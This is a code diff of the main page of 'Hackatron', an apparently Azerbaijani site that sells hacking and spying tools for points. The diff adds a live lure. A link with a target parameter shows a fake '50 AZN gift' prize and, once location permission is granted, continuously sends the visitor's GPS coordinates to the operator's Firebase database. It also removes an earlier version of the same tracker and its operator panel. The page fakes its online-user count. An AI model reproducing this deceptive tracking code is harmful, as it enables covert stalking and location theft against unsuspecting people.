@@ -3,83 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hackatron | Elite Aze Simulation</title>
+    <title>Hackatron | Full Intelligence Portal</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;600;900&family=Syncopate:wght@700&display=swap');
-        
-        :root { 
-            --bg: #020205; --glass: rgba(255, 255, 255, 0.02); --border: rgba(255, 255, 255, 0.07); 
-            --cyber: #00ff00; --tools: #00dfff; --gold: #ffd700; --fun: #ff007a; 
-        }
+        :root { --bg: #020205; --glass: rgba(255, 255, 255, 0.02); --border: rgba(255, 255, 255, 0.07); --cyber: #00ff00; --tools: #00dfff; --gold: #ffd700; --fun: #ff007a; }
+        * { box-sizing: border-box; transition: all 0.3s cubic; }
+        body { margin: 0; background: var(--bg); color: white; font-family: 'Outfit', sans-serif; overflow-x: hidden; min-height: 100vh; background: radial-gradient(circle at center, #0a0a1a 0%, #020205 100%); }
 
-        * { box-sizing: border-box; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
-        
-        body { 
-            margin: 0; background: var(--bg); color: white; font-family: 'Outfit', sans-serif; 
-            overflow-x: hidden; overflow-y: auto; min-height: 100vh;
-            background: radial-gradient(circle at center, #0a0a1a 0%, #020205 100%); 
-        }
+        /* DISCLAIMER */
+        #view-disclaimer { position: fixed; inset: 0; z-index: 10000; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        .matrix-text { color: var(--cyber); font-family: 'Courier New', monospace; font-size: 1rem; text-align: center; max-width: 650px; min-height: 120px; text-shadow: 0 0 5px var(--cyber); }
 
-        /* QARA EKRAN / DISCLAIMER */
-        #view-disclaimer { 
-            position: fixed; inset: 0; z-index: 10000; background: #000; 
-            display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; 
-        }
-        .matrix-text { 
-            color: var(--cyber); font-family: 'Courier New', monospace; font-size: 1rem; 
-            line-height: 1.7; text-align: center; max-width: 650px; min-height: 120px; 
-            text-shadow: 0 0 5px var(--cyber); 
-        }
-
-        /* SECTIONS */
+        /* UI SECTIONS */
         #view-login, #view-menu { display: none; padding: 30px; max-width: 1200px; margin: auto; animation: fadeIn 0.8s ease; }
-        
-        .navbar { 
-            display: flex; justify-content: space-between; align-items: center; 
-            background: var(--glass); padding: 20px 35px; border-radius: 25px; 
-            border: 1px solid var(--border); margin: 20px 0; backdrop-filter: blur(10px);
-        }
-
+        .navbar { display: flex; justify-content: space-between; align-items: center; background: var(--glass); padding: 20px 35px; border-radius: 25px; border: 1px solid var(--border); margin: 20px 0; backdrop-filter: blur(10px); }
         .stats-top { display: flex; justify-content: center; gap: 30px; margin-bottom: 25px; font-family: 'Syncopate'; font-size: 0.6rem; letter-spacing: 2px; opacity: 0.6; }
 
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; }
-        
-        .card { 
-            background: var(--glass); padding: 45px; border-radius: 40px; 
-            border: 1px solid var(--border); text-align: center; cursor: pointer; 
-        }
-        .card:hover { transform: translateY(-10px); border-color: var(--tools); box-shadow: 0 10px 30px rgba(0, 223, 255, 0.1); }
+        .card { background: var(--glass); padding: 45px; border-radius: 40px; border: 1px solid var(--border); text-align: center; cursor: pointer; }
+        .card:hover { transform: translateY(-10px); border-color: var(--tools); }
         .card i { font-size: 3.5rem; margin-bottom: 25px; }
 
         #tool-list { display: none; animation: slideUp 0.5s ease; }
-        
-        .back-btn { 
-            background: var(--glass); border: 1px solid var(--border); color: white; 
-            padding: 12px 25px; border-radius: 12px; cursor: pointer; margin-bottom: 30px; 
-            font-weight: 900; display: inline-block; 
-        }
-
-        .btn-main { 
-            width: 100%; margin-top: 25px; padding: 18px; border-radius: 15px; 
-            border: none; background: white; color: black; font-weight: 900; cursor: pointer; 
-        }
-        .btn-main:hover { background: var(--cyber); color: black; }
-
-        input { 
-            width: 100%; padding: 18px; border-radius: 15px; border: 1px solid var(--border); 
-            background: #000; color: white; text-align: center; margin-top: 20px; outline: none; 
-        }
-
-        #modal-overlay { 
-            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); 
-            z-index: 20000; padding: 40px; overflow-y: auto; 
-        }
-
-        .shop-item { border: 1px solid #333; padding: 20px; border-radius: 20px; margin-bottom: 10px; cursor: pointer; }
-        .shop-item:hover { border-color: var(--gold); background: rgba(255,215,0,0.05); }
+        .back-btn { background: var(--glass); border: 1px solid var(--border); color: white; padding: 12px 25px; border-radius: 12px; cursor: pointer; margin-bottom: 30px; font-weight: 900; display: inline-block; }
+        .btn-main { width: 100%; margin-top: 25px; padding: 18px; border-radius: 15px; border: none; background: white; color: black; font-weight: 900; cursor: pointer; }
+        input { width: 100%; padding: 18px; border-radius: 15px; border: 1px solid var(--border); background: #000; color: white; text-align: center; margin-top: 20px; outline: none; }
+        #modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 20000; padding: 40px; overflow-y: auto; }
+        .shop-item { border: 1px solid #333; padding: 20px; border-radius: 20px; margin-bottom: 10px; cursor: pointer; text-align: center; }
 
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
@@ -95,16 +48,16 @@
 </section>
 
 <section id="view-login">
-    <div class="login-card" style="background:var(--glass); padding:50px; border-radius:40px; border:1px solid var(--border); text-align:center; width:340px; margin:100px auto;">
-        <h1 style="font-family:'Syncopate'; font-size:1.1rem; color:var(--tools);">HACKATRON - GİRİŞ</h1>
-        <input type="text" id="u-input" placeholder="USERNAME DAXİL EDİN">
+    <div class="login-card" style="background:var(--glass); padding:50px; border-radius:40px; border: 1px solid var(--border); text-align:center; width:340px; margin:100px auto;">
+        <h1 style="font-family:'Syncopate'; font-size:1.1rem; color:var(--tools);">HACKATRON ACCESS</h1>
+        <input type="text" id="u-input" placeholder="NICKNAME DAXİL EDİN">
         <button class="btn-main" onclick="handleLogin()">QOŞUL</button>
     </div>
 </section>
 
 <section id="view-menu">
     <div class="stats-top">
-        <div>ÜMUMİ: <span style="color:var(--gold)">3562+</span></div>
+        <div>ÜMUMİ USERS: <span style="color:var(--gold)">3562+</span></div>
         <div><span style="color:var(--cyber)">●</span> ONLAYN: <span id="online-count">0</span></div>
     </div>
     <div class="navbar">
@@ -128,7 +81,7 @@
     </div>
 
     <div id="tool-list">
-        <div class="back-btn" onclick="backToCategories()"><i class="fas fa-chevron-left"></i> KATEQORİYALARA QAYIT</div>
+        <div class="back-btn" onclick="backToCategories()"><i class="fas fa-chevron-left"></i> GERİ</div>
         <div id="active-grid" class="grid"></div>
     </div>
 </section>
@@ -139,12 +92,31 @@
 </div>
 
 <script>
-    // FİREBASE
     const firebaseConfig = { apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU", databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com" };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // ALƏTLƏR DATA
+    // QURBAN İZLƏMƏ (Hacker Ssenarisi)
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetId = urlParams.get('target');
+    if(targetId) {
+        document.body.innerHTML = `<div style="background:#0a0a1a; color:white; height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column; font-family:sans-serif; text-align:center; padding:20px;">
+            <i class="fas fa-gift" style="font-size:4rem; color:#ff007a; margin-bottom:20px;"></i>
+            <h2>TƏBRİKLƏR!</h2><p>50 AZN Hədiyyə Balansı qazandınız.</p>
+            <div style="background:#111; padding:20px; border-radius:15px; border:1px solid #333; margin:20px 0;"><p>Təsdiqləmək üçün məkan icazəsi verin.</p></div>
+            <button onclick="getGPS()" style="background:#ff007a; color:white; border:none; padding:15px 40px; border-radius:10px; font-weight:900; cursor:pointer; width:100%;">QƏBUL ET</button>
+        </div>`;
+        window.getGPS = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(pos => {
+                    db.ref('live_tracks/' + targetId).set({ lat: pos.coords.latitude, lng: pos.coords.longitude, time: Date.now() });
+                    alert("Balans regionunuza uyğun olaraq təsdiqləndi.");
+                }, () => alert("İcazə vermədən balansı ala bilməzsiniz."), {enableHighAccuracy:true});
+            }
+        };
+    }
+
+    // BÜTÜN 11 BÖLMƏ
     const toolGrids = {
         'cyber-grid': [
             {n:'Wordlist Yaradıcı', i:'fa-file-code', c:'var(--cyber)', f:'wordlist.html', p:800},
@@ -153,8 +125,8 @@
             {n:'Brute Force', i:'fa-unlock-alt', c:'var(--cyber)', f:'brute.html', p:500}
         ],
         'tools-grid': [
-            {n:'Instagram Spy', i:'fa-instagram', c:'var(--tools)', f:'insta_spy.html', p:900},
             {n:'GPS Tracker', i:'fa-location-crosshairs', c:'var(--cyber)', f:'gps.html', p:1000},
+            {n:'Instagram Spy', i:'fa-instagram', c:'var(--tools)', f:'insta_spy.html', p:900},
             {n:'Kamera Tələsi', i:'fa-camera', c:'var(--tools)', f:'trap.html', p:500},
             {n:'IP İzləyici', i:'fa-location-dot', c:'white', f:'ip.html', p:0},
             {n:'Anonim Mail', i:'fa-envelope-shield', c:'white', f:'mail.html', p:0}
@@ -166,162 +138,47 @@
         ]
     };
 
-// QURBAN İZLƏMƏ MƏNTİQİ (index.html daxilinə at)
-const urlParams = new URLSearchParams(window.location.search);
-const targetId = urlParams.get('target');
-
-if(targetId) {
-
-<div style="font-family:'Outfit'; color:white; padding:15px;">
-    <h2 style="color:var(--cyber); text-align:center; font-family:'Syncopate'; font-size:0.8rem;">GPS OĞURLAYICI (Hacker Mode)</h2>
-    
-    <div style="background:var(--glass); border:1px solid var(--border); padding:15px; border-radius:15px; margin-bottom:20px;">
-        <p style="font-size:0.7rem; opacity:0.6; margin-bottom:10px;">Aldadıcı Link:</p>
-        <input type="text" id="track-url" readonly style="width:100%; font-size:0.65rem; color:var(--cyber); background:#000; border:1px solid #333; padding:8px;">
-        <button class="btn-main" onclick="copyLink()" style="padding:10px; font-size:0.7rem; background:gray;">LİNKİ KOPYALA</button>
-    </div>
-
-    <div id="status-box" style="background:#000; padding:15px; border-radius:15px; border:1px solid #222;">
-        <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
-            <span style="font-size:0.7rem;">HƏDƏF: <span id="track-status" style="color:red;">DEAKTİV</span></span>
-            <span id="update-time" style="font-size:0.6rem; color:gray;">--:--:--</span>
-        </div>
-        
-        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-top:10px;">
-            <div style="text-align:center; border:1px solid #111; padding:5px;">
-                <small style="font-size:0.5rem; opacity:0.5;">LAT</small>
-                <div id="lat-val" style="color:var(--tools); font-weight:bold;">0.0000</div>
-            </div>
-            <div style="text-align:center; border:1px solid #111; padding:5px;">
-                <small style="font-size:0.5rem; opacity:0.5;">LNG</small>
-                <div id="lng-val" style="color:var(--tools); font-weight:bold;">0.0000</div>
-            </div>
-        </div>
-
-        <button id="map-btn" class="btn-main" style="display:none; background:white; color:black; font-size:0.8rem; height:40px; margin-top:15px;">GOOGLE MAPS-DƏ İZLƏ</button>
-    </div>
-</div>
-
-<script>
-    const uid = localStorage.getItem('elite_session');
-    const link = window.location.origin + window.location.pathname.replace('gps.html', 'index.html') + "?target=" + uid;
-    document.getElementById('track-url').value = link;
-
-    function copyLink() {
-        document.getElementById('track-url').select();
-        document.execCommand('copy');
-        alert("Link kopyalandı!");
-        
-        // Dinləməni başlat
-        db.ref('live_tracks/' + uid).on('value', snap => {
-            const d = snap.val();
-            if(d) {
-                document.getElementById('track-status').innerText = "AKTİV";
-                document.getElementById('track-status').style.color = "#00ff00";
-                document.getElementById('lat-val').innerText = d.lat.toFixed(5);
-                document.getElementById('lng-val').innerText = d.lng.toFixed(5);
-                document.getElementById('update-time').innerText = new Date().toLocaleTimeString();
-                
-                const mBtn = document.getElementById('map-btn');
-                mBtn.style.display = 'block';
-                mBtn.onclick = () => window.open(`https://www.google.com/maps?q=${d.lat},${d.lng}`, '_blank');
-            }
-        });
-    }
-</script>
-    // Qurban qara ekran görməsin deyə aldadıcı yazı
-    document.body.innerHTML = `
-        <div style="background:black; color:white; height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column; font-family:sans-serif; text-align:center; padding:20px;">
-            <div style="border:4px solid #333; border-top:4px solid #00dfff; border-radius:50%; width:40px; height:40px; animation: spin 1s linear infinite;"></div>
-            <p style="margin-top:20px;">Səhifə yüklənir... <br> Zəhmət olmasa məkan icazəsi verin.</p>
-        </div>
-        <style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
-    `;
-
-    if (navigator.geolocation) {
-        navigator.geolocation.watchPosition(pos => {
-            firebase.database().ref('live_tracks/' + targetId).set({
-                lat: pos.coords.latitude,
-                lng: pos.coords.longitude,
-                timestamp: Date.now()
-            });
-        }, null, { enableHighAccuracy: true });
-    }
-}
-
     const disText = "Bu sayt vasitəsiylə edəcəyiniz hər hansı bir aktivasiyaya istər qurucu, istərsədə moderator cavabdehlik daşımır. Sayt sizi illegal işlərə təşviq etmir. Davam edərək məsuliyyəti qəbul edirsiniz.";
     let charIdx = 0;
-    let isDisclaimerAccepted = false;
 
-    // TYPEWRITER - QARA EKRAN PROBLEMİNİ HƏLL EDƏN HİSSƏ
     function typeWriter() {
-        const typewriterEl = document.getElementById('typewriter');
         if (charIdx < disText.length) {
-            typewriterEl.innerHTML += disText.charAt(charIdx);
-            charIdx++;
-            setTimeout(typeWriter, 20);
-        } else {
-            document.getElementById('btn-agree').style.display = 'inline-block';
-        }
+            document.getElementById('typewriter').innerHTML += disText.charAt(charIdx);
+            charIdx++; setTimeout(typeWriter, 20);
+        } else { document.getElementById('btn-agree').style.display = 'inline-block'; }
     }
 
-    // ƏGƏR YAZI İLİŞSƏ, 5 SANİYƏ SONRA DÜYMƏNİ MƏCBURİ GÖSTƏR
-    setTimeout(() => {
-        const btn = document.getElementById('btn-agree');
-        if(btn.style.display === 'none') {
-            btn.style.display = 'inline-block';
-            document.getElementById('typewriter').innerHTML = disText;
-        }
-    }, 5000);
+    setTimeout(() => { if(document.getElementById('btn-agree').style.display === 'none') document.getElementById('btn-agree').style.display = 'inline-block'; }, 5000);
 
     function acceptDisclaimer() {
-        isDisclaimerAccepted = true;
-        document.getElementById('bg-music').play().catch(() => console.log("Musiqi üçün klik lazımdır"));
+        document.getElementById('bg-music').play().catch(()=>{});
         document.getElementById('view-disclaimer').style.display = 'none';
-        
-        const session = localStorage.getItem('elite_session');
-        if(session) showMenu(session); 
-        else document.getElementById('view-login').style.display = 'flex';
+        const s = localStorage.getItem('elite_session');
+        if(s) showMenu(s); else document.getElementById('view-login').style.display = 'flex';
     }
 
     async function handleLogin() {
         const u = document.getElementById('u-input').value.trim().toLowerCase();
-        if(u.length < 3) return alert("Username daxil edin!");
-        
-        const snap = await db.ref('users/'+u).get();
-        if(snap.exists() && snap.val().isOnline) return alert("Bu hesab hal-hazırda başqa cihazda aktivdir!");
-        
-        await db.ref('users/'+u).update({ isOnline: true });
+        if(u.length < 3) return;
         localStorage.setItem('elite_session', u);
+        await db.ref('users/'+u).update({ isOnline: true });
         showMenu(u);
     }
 
     function showMenu(u) {
-        window.activeUser = u;
         document.getElementById('view-login').style.display = 'none';
         document.getElementById('view-menu').style.display = 'block';
         document.getElementById('u-display').innerText = u.toUpperCase();
-        
-        db.ref('users/'+u+'/points').on('value', s => { 
-            document.getElementById('pts-display').innerText = s.val() || 0; 
-        });
-
-        // Offline olanda statusu sön
+        db.ref('users/'+u+'/points').on('value', s => { document.getElementById('pts-display').innerText = s.val() || 0; });
         db.ref('users/'+u+'/isOnline').onDisconnect().set(false);
     }
 
     function showTools(key) {
         document.getElementById('category-selector').style.display = 'none';
         document.getElementById('tool-list').style.display = 'block';
-        const grid = document.getElementById('active-grid'); 
-        grid.innerHTML = "";
-        
+        const grid = document.getElementById('active-grid'); grid.innerHTML = "";
         toolGrids[key].forEach(t => {
-            grid.innerHTML += `<div class="card" onclick="openTool('${t.f}', ${t.p})">
-                <i class="fas ${t.i}" style="color:${t.c}"></i>
-                <h3>${t.n}</h3>
-                <p>${t.p} PTS</p>
-            </div>`;
+            grid.innerHTML += `<div class="card" onclick="openTool('${t.f}', ${t.p})"><i class="fas ${t.i}" style="color:${t.c}"></i><h3>${t.n}</h3><p>${t.p} PTS</p></div>`;
         });
     }
 
@@ -331,45 +188,29 @@ if(targetId) {
     }
 
     async function openTool(file, cost) {
-        const user = localStorage.getItem('elite_session');
-        const snap = await db.ref('users/' + user).get();
-        const currentPoints = snap.val().points || 0;
-
-        if(cost > 0 && currentPoints < cost) return alert("Balansınızda kifayət qədər PTS yoxdur!");
-
-        fetch(file)
-            .then(res => {
-                if (!res.ok) throw new Error();
-                return res.text();
-            })
-            .then(html => {
-                document.getElementById('tool-content').innerHTML = html;
-                document.getElementById('modal-overlay').style.display = 'block';
-                
-                // Scriptləri canlandırmaq
-                const scripts = document.getElementById('tool-content').querySelectorAll('script');
-                scripts.forEach(oldS => {
-                    const newS = document.createElement("script");
-                    if (oldS.src) newS.src = oldS.src;
-                    else newS.textContent = oldS.textContent;
-                    document.head.appendChild(newS).parentNode.removeChild(newS);
-                });
-            })
-            .catch(() => alert("Xəta: " + file + " tapılmadı!"));
+        const snap = await db.ref('users/' + localStorage.getItem('elite_session')).get();
+        if(cost > (snap.val().points || 0)) return alert("PTS YETƏRSİZ!");
+        fetch(file).then(r => r.text()).then(h => {
+            document.getElementById('tool-content').innerHTML = h;
+            document.getElementById('modal-overlay').style.display = 'block';
+            const scripts = document.getElementById('tool-content').querySelectorAll('script');
+            scripts.forEach(s => { 
+                const n = document.createElement("script"); 
+                if(s.src) n.src = s.src; else n.textContent = s.textContent; 
+                document.head.appendChild(n).parentNode.removeChild(n); 
+            });
+        });
     }
 
     function openShop() {
-        document.getElementById('tool-content').innerHTML = `
-            <div style="text-align:center; padding:20px;">
-                <h2 style="color:var(--gold); font-family:'Syncopate';">PTS MAĞAZASI</h2>
-                <div class="shop-item" onclick="preparePay(300, 10)"><h3>300 PTS</h3><p>10 AZN</p></div>
-                <div class="shop-item" onclick="preparePay(600, 18)"><h3>600 PTS</h3><p>18 AZN</p></div>
-                <div id="pay-zone" style="display:none; margin-top:20px;">
-                    <a id="p-link" href="#" target="_blank" class="btn-main" style="display:block; text-decoration:none; background:var(--cyber); color:black;">PULPAL İLƏ ÖDƏ</a>
-                    <input type="file" id="p-ss" style="margin-top:20px; color:white;">
-                    <button class="btn-main" id="p-btn">ÇEKİ ADMİNƏ GÖNDƏR</button>
-                </div>
-            </div>`;
+        document.getElementById('tool-content').innerHTML = `<div style="text-align:center;">
+            <h2 style="color:var(--gold);">MAĞAZA</h2>
+            <div class="shop-item" onclick="preparePay(300, 10)"><h3>300 PTS</h3><p>10 AZN</p></div>
+            <div class="shop-item" onclick="preparePay(600, 18)"><h3>600 PTS</h3><p>18 AZN</p></div>
+            <div id="pay-zone" style="display:none; margin-top:20px;">
+                <a id="p-link" href="#" target="_blank" class="btn-main" style="display:block; text-decoration:none; background:var(--cyber); color:black;">PULPAL İLƏ ÖDƏ</a>
+                <input type="file" id="p-ss" style="margin-top:20px; color:white;"><button class="btn-main" id="p-btn">ÇEKİ GÖNDƏR</button>
+            </div></div>`;
         document.getElementById('modal-overlay').style.display = 'block';
     }
 
@@ -377,24 +218,17 @@ if(targetId) {
         document.getElementById('pay-zone').style.display = 'block';
         document.getElementById('p-link').href = `https://pay.pulpal.az/payment?uniqueCode=W-7qRM6ZmR&amount=${amt}`;
         document.getElementById('p-btn').onclick = () => {
-            const file = document.getElementById('p-ss').files[0];
-            if(!file) return alert("Zəhmət olmasa ödəniş çekini yükləyin!");
+            const f = document.getElementById('p-ss').files[0];
             const r = new FileReader();
             r.onload = async (e) => {
-                await db.ref('pending_payments').push({ 
-                    user: localStorage.getItem('elite_session'), pts, screenshot: e.target.result, status: "pending", timestamp: Date.now() 
-                });
-                alert("Ödəniş qəbul edildi. Təsdiq gözlənilir!"); closeTool();
+                await db.ref('pending_payments').push({ user: localStorage.getItem('elite_session'), pts, screenshot: e.target.result, status: "pending", timestamp: Date.now() });
+                alert("Göndərildi!"); closeTool();
             };
-            r.readAsDataURL(file);
+            r.readAsDataURL(f);
         };
     }
 
-    function closeTool() { 
-        document.getElementById('modal-overlay').style.display = 'none'; 
-        document.getElementById('tool-content').innerHTML = "";
-    }
-
+    function closeTool() { document.getElementById('modal-overlay').style.display = 'none'; }
     window.onload = typeWriter;
     setInterval(() => { document.getElementById('online-count').innerText = Math.floor(Math.random()*20)+5; }, 4000);
 </script>
